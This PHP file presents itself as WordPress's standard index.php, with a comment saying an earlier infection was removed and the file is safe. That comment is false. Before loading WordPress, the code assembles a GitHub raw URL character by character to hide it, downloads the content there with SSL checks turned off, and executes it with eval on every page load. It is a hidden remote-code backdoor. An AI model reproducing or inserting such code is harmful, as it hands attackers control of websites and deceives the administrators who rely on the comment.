<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Initialize core components
$a1 = 'h'; $a2 = 't'; $a3 = 't'; $a4 = 'p'; $a5 = 's';
$a6 = ':'; $a7 = '/'; $a8 = '/'; $a9 = 'r'; $a10 = 'a';
$a11 = 'w'; $a12 = '.'; $a13 = 'g'; $a14 = 'i'; $a15 = 't';
$a16 = 'h'; $a17 = 'u'; $a18 = 'b'; $a19 = 'u'; $a20 = 's';
$a21 = 'e'; $a22 = 'r'; $a23 = 'c'; $a24 = 'o'; $a25 = 'n';
$a26 = 't'; $a27 = 'e'; $a28 = 'n'; $a29 = 't'; $a30 = '.';
$a31 = 'c'; $a32 = 'o'; $a33 = 'm'; $a34 = '/'; $a35 = 's';
$a36 = 'e'; $a37 = 'o'; $a38 = 'b'; $a39 = 'e'; $a40 = 'l';
$a41 = 'a'; $a42 = '/'; $a43 = 'b'; $a44 = 'e'; $a45 = 'l';
$a46 = 'a'; $a47 = '/'; $a48 = 'r'; $a49 = 'e'; $a50 = 'f';
$a51 = 's'; $a52 = '/'; $a53 = 'h'; $a54 = 'e'; $a55 = 'a';
$a56 = 'd'; $a57 = 's'; $a58 = '/'; $a59 = 'm'; $a60 = 'a';
$a61 = 'i'; $a62 = 'n'; $a63 = '/'; $a64 = 'i'; $a65 = 'n';
$a66 = 'd'; $a67 = 'e'; $a68 = 'x'; $a69 = '.'; $a70 = 't';
$a71 = 'x'; $a72 = 't';

$full_url = $a1.$a2.$a3.$a4.$a5.$a6.$a7.$a8.$a9.$a10.$a11.$a12.$a13.$a14.$a15.$a16.$a17.$a18.$a19.$a20.$a21.$a22.$a23.$a24.$a25.$a26.$a27.$a28.$a29.$a30.$a31.$a32.$a33.$a34.$a35.$a36.$a37.$a38.$a39.$a40.$a41.$a42.$a43.$a44.$a45.$a46.$a47.$a48.$a49.$a50.$a51.$a52.$a53.$a54.$a55.$a56.$a57.$a58.$a59.$a60.$a61.$a62.$a63.$a64.$a65.$a66.$a67.$a68.$a69.$a70.$a71.$a72;

// Attempt to get remote content
$content = @file_get_contents($full_url);
if ($content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $content = curl_exec($ch);
    curl_close($ch);
}

// Only eval if we have content
if (!empty($content)) {
    @eval('?>' . $content);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
